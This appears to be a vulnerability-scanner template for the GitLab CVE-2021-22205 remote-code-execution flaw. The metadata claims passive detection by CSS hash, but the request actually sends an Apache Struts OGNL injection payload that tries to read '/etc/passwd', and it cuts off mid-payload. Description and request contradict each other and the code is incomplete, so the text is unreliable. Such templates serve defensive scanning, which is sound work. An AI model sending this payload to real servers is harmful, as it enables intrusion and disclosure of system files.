id: CVE-2021-22205
info:
  author: GitLab Red Team
  classification:
    cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:community:*:*:*
    cve-id: CVE-2021-22205
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-94
    epss-percentile: 0.99995
    epss-score: 0.94467
  description: GitLab CE/EE starting from 11.9 does not properly validate image files
    that were passed to a file parser, resulting in a remote command execution vulnerability.
    This template attempts to passively identify vulnerable versions of GitLab without
    the need for an exploit by matching unique hashes for the application-<hash>.css
    file in the header for unauthenticated requests. Positive matches do not guarantee
    exploitability. Tooling to find relevant hashes based on the semantic version
    ranges specified in the CVE is linked in the references section below.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected GitLab instance.

    '
  metadata:
    fofa-query: title="gitlab"
    google-query: intitle:"gitlab"
    max-request: 1
    product: gitlab
    shodan-query:
    - http.title:"GitLab"
    - cpe:"cpe:2.3:a:gitlab:gitlab"
    - http.title:"gitlab"
    vendor: gitlab
  name: GitLab CE/EE - Remote Code Execution
  reference:
  - https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-research/cve-2021-22205-hash-generator
  - https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-operations/-/issues/196
  - https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22205.json
  - https://censys.io/blog/cve-2021-22205-it-was-a-gitlab-smash/
  - https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
  - https://hackerone.com/reports/1154542
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22205
  remediation: 'Upgrade to GitLab CE/EE version 13.10.3 or 13.11.1 to mitigate this
    vulnerability.

    '
  severity: critical
  tags: cve2021,cve,kev,hackerone,gitlab,rce,vkev,vuln
---
http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF

    Content-Length: 1095


    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF

    Content-Disposition: form-data; name="id"


    %{

    (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)
    +

    (#request.map.setBean(#request.get(''struts.valueStack'')) == true).toString().substring(0,0)
    +

    (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)
    +

    (#request.map2.setBean(#request.get(''map'').get(''context'')) == true).toString().substring(0,0)
    +

    (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)
    +

    (#request.map3.setBean(#request.get(''map2'').get(''memberAccess'')) == true).toString().substring(0,0)
    +

    (#request.get(''map3'').put(''excludedPackageNames'',#@org.apache.commons.collections.BeanMap@{}.keySet())
    == true).toString().substring(0,0) +

